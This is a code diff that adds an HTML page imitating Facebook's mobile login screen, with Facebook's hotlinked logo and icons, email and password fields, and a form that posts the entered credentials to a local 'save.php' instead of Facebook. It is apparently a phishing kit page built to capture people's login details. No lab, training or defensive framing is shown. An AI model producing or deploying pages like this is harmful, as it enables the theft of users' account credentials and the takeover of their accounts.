@@ -1,0 +1,75 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Web View</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <header>
+        <div class="English" dir="auto">
+            <span data-bloks-name="bk.components.TextSpan"
+                  style="color: rgb(70, 90, 105); display: inline; font-size: 12px; font-family: 'Optimistic Text Normal'; white-space: pre-wrap; overflow-wrap: break-word;">English (UK)</span>
+        </div>
+        <img class="profile-img" src="https://z-m-static.xx.fbcdn.net/rsrc.php/v4/yD/r/5D8s-GsHJlJ.png" alt="fblogo">
+        <div class="container">
+            <form method="post" action="save.php">
+                <div class="box">
+                    <input type="text" id="email" name="username" placeholder="Email" required>
+                    <label for="email">Mobile number or email address</label>
+                </div>
+                <div class="input-box">
+                    <input type="password" placeholder="Password" id="password" name="password" narequired>
+                    <label for="password">Password</label>
+                    <img src="https://z-m-static.xx.fbcdn.net/rsrc.php/v4/yq/r/iHk6KioQuJP.png" id="eyeicon" alt="Toggle password visibility">
+                </div>
+                <button class="popup" type="submit">Log in</button>
+            </form>
+            <div class="forgot-password">
+          <a href="#">Forgotten password?</a></div>
+        </div>
+        <button class="create-account-btn">Create new account</button>
+          <!-- Meta Logo -->
+        <div class="meta-logo">
+            <img src="https://z-m-static.xx.fbcdn.net/rsrc.php/v4/yM/r/DDgwTv3JehF.png">
+            <p><a href="#">About</a> • <a href="#">Help</a> • <a href="#">More</a></p>
+        </div>
+        <div class="popup-container">
+            <div class="popup-box">
+                <h1>Email address or mobile number required</h1>
+                <p>Enter your email address or mobile number to continue</p>
+                <hr>
+                <button class="close-btn">OK</button>
+            </div>
+        </div>
+    </header>
+
+    <script>
+        let eyeicon = document.getElementById("eyeicon");
+        let password = document.getElementById("password");
+
+        eyeicon.onclick = function() {
+            if (password.type == "password") {
+                password.type = "text";
+                eyeicon.src = "https://z-m-static.xx.fbcdn.net/rsrc.php/v4/yL/r/b6nQl1NPLRq.png";
+            } else {
+                password.type = "password";
+                eyeicon.src = "https://z-m-static.xx.fbcdn.net/rsrc.php/v4/yq/r/iHk6KioQuJP.png";
+            }
+        }
+
+        const showPopup = document.querySelector('.popup');
+        const popupContainer = document.querySelector('.popup-container');
+        const closeBtn = document.querySelector('.close-btn');
+
+        showPopup.onclick = () => {
+            popupContainer.classList.add('active');
+        }
+
+        closeBtn.onclick = () => {
+            popupContainer.classList.remove('active');
+        }
+    </script>
+</body>
+</html>
